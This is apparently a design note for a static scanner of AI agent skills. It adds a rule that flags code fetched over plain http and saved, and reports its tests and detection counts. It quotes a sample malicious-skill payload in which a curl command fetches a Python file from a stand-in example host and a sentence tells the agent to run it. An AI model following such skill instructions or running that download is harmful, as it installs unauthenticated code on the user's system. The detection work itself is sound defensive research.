<!-- SPDX-License-Identifier: MIT -->
# 094 — Code downloaded over plaintext HTTP and kept is SUP-007 at high

- **Source**: the maintainer, 2026-10-22 ("后续这几个都做": the static shapes left after P-091)
- **Depends on**: P-093 (stacked on its branch)
- **Branch**: `p/094-code-over-plain-http`

## Problem

SkillHarm's malware-deployment trees were 0 of 20 caught statically. Their payload is a download kept for later:
`curl -fsSL http://profile-calibration.tools.example:8080/setup/calibrator.py -o /app/calibrator.py` in a code block,
then a sentence telling the agent to import or run it. `EXEC-001` sees only `curl … | sh`; `EXEC-012` only `$(curl …)`;
the two-step form was recorded as a known limitation in `EXEC-012`'s comment.

Download-then-run as such cannot be a rule: fetching a release installer over https and running it is how 13 benign
trees in the corpus set a tool up (`get.docker.com`, GitHub release assets). What separates the malicious form on the
corpus is the scheme: every one of them fetches code over plain `http://`, and no benign sample does.

## Initial direction

`SUP-007` (dimension 5, high), a line rule: `wget` of an `http://` URL whose path is code (wget keeps the file by
default); `curl` of such a URL with `-o`/`-O`/`--output`/`--remote-name`/`>` before or after it; `curl`/`wget` of any
`http://` URL saved under a code name; `urlretrieve("http://…")` of code or into a code name. Code = `.py .sh .bash .zsh
.js .mjs .cjs .ts .ps1 .pl .rb .php`. Loopback (`localhost`, `127.x`, `0.0.0.0`, `[::1]`) is vetoed with `exceptWhen`.
OWASP position ASI-04. No `rulesEpoch` change: a table rule moves the rules version on its own.

## Done criteria

- [x] `TestDetect_CodeOverPlainHTTP`: seven forms fire at high / dim 5 (`-o` after the URL, an extensionless URL saved as
  `.py`, `-o … && bash`, `wget` of a `.sh`, `wget -O` into a `.py`, `curl -sO`, `urlretrieve`); seven stay quiet (https
  installer then `sh`, https release `.sh`, plain-http archive, plain-http `.json` saved, curl printing a `.sh`, two
  loopback forms)
- [x] Static over the same sets as P-092, against the P-093 branch; no benign or hard-negative sample anywhere carries
  any of `FS-005`, `EXEC-013`, `SUP-007` (checked on the per-sample raw output, not only the flag)
- [x] `make verify`; `docs/rules.md` regenerated; `.claude/rules/detect.md`

## Out of scope

A URL held in a variable (`ACCEL_URL = "http://…"` then `["curl", …, ACCEL_URL, "-o", DEST]`): one development tree.
Python `urlopen(...).read()` written to a file across lines. https downloads, by design.

## Must not claim

Not "detects malware deployment": it sees one transport. A payload fetched over https and then run is invisible to it,
and the corpus's malicious samples all using plain http is a property of the generator, not of attackers — real
attackers can use https. The rule stands on its own merits (code whose bytes nothing authenticates), not on the
corpus count.

## Measured

Static, corpus `6d7aa48e`, the P-093 branch (`results/aguard/2026-10-22-p093-*-changed`) against this branch
(`results/aguard/2026-10-22-p094-*-changed`), built the same day.

| | n | P-093 | P-094 |
|---|---:|---:|---:|
| malicious skill trees (development) | 393 | 112 | **122** |
| held-out malicious (ClawHub 123 + SkillHarm fresh 120) | 243 | 77 | **80** |
| benign skill trees (development) | 2,879 | 162 | 162 |
| held-out ClawHub benign | 216 | 6 | 6 |
| freshly sampled benign skills | 200 | 38 | 38 |
| every non-skill sample: malicious / benign | 156 / 1,627 | 39 / 245 | 39 / 245 |

All thirteen trees gained are SkillHarm malware-deployment (development 0 → 10 of 20, held-out 3).

**P-092 to P-094 together**, main `b4c1dba` against this branch: development malicious 98 → 122 of 393 (+24),
held-out malicious 73 → 80 of 243 (+7), one more non-skill malicious sample; benign 0 gained on 4,922 samples and
none carries any of the three new rules.

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | The rule, its tests and measurement | P-094: code downloaded over plaintext HTTP and kept is SUP-007 at high; measured |
